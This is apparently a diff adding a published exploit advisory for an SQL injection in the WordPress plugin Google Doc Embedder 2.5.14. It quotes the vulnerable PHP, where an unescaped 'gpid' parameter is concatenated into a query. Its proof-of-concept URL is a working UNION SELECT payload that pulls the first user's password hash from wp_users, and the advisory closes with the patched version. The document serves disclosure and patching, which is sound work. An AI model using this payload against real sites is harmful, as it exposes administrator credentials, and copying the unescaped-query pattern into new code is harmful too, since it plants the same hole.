@@ -1,0 +1,48 @@
+# Exploit Title: Google Doc Embedder 2.5.14 SQL Injection
+# Date: 10-11-2014
+# Exploit Author: Kacper Szurek - http://security.szurek.pl http://twitter.com/KacperSzurek
+# Software Link: https://downloads.wordpress.org/plugin/google-document-embedder.2.5.14.zip
+# Category: webapps
+  
+1. Description
+  
+$_GET['gpid'] is not escaped.
+
+File: google-document-embedder\view.php
+if ( isset( $_GET['gpid'] ) ) {
+	if ( $profile = gde_get_profile( $_GET['gpid'] ) ) {
+		$tb = $profile['tb_flags'];
+		$vw = $profile['vw_flags'];
+		$bg = $profile['vw_bgcolor'];
+		$css = $profile['vw_css'];
+	}
+}
+
+So we control $id.
+
+File: google-document-embedder\view.php
+function gde_get_profile( $id ) {
+	global $wpdb;
+	$table = $wpdb->prefix . 'gde_profiles';
+
+	$profile = $wpdb->get_results( "SELECT * FROM $table WHERE profile_id = $id", ARRAY_A );
+	$profile = unserialize($profile[0]['profile_data']);
+
+	if ( is_array($profile) ) {
+		return $profile;
+	} else {
+		return false;
+	}
+}
+
+http://security.szurek.pl/google-doc-embedder-2514-sql-injection.html
+  
+2. Proof of Concept
+  
+http://wordpress-install/wp-content/plugins/google-document-embedder/view.php?embedded=1&gpid=0 UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(user_pass), CAST(CHAR(58, 34) as CHAR), user_pass, CAST(CHAR(34, 59, 125) as CHAR)) FROM `wp_users` WHERE ID=1
+  
+3. Solution:
+  
+Update to version 2.5.15
+https://downloads.wordpress.org/plugin/google-document-embedder.2.5.15.zip
+https://plugins.trac.wordpress.org/changeset/1023572/google-document-embedder
